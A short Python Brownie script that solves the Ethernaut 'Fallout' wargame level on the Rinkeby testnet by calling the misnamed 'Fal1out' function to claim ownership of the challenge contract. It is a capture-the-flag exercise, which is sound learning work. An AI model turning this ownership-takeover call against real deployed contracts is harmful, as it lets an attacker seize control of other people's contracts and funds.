from brownie import accounts, Fallout
from web3 import Web3

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x95C0C1388d449c6e9b289ff357626335569c3EED"
fallout = Fallout.at(instance_address)

# -------------------------------------------------------------------
# to complete this level we need to claim ownership of the contract
# -------------------------------------------------------------------


def level_completed():
    return fallout.owner() == account.address


def exploit():
    # we simply call the Fal1out function
    tx = fallout.Fal1out({"from": account})
    tx.wait(1)

    # confirm that we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
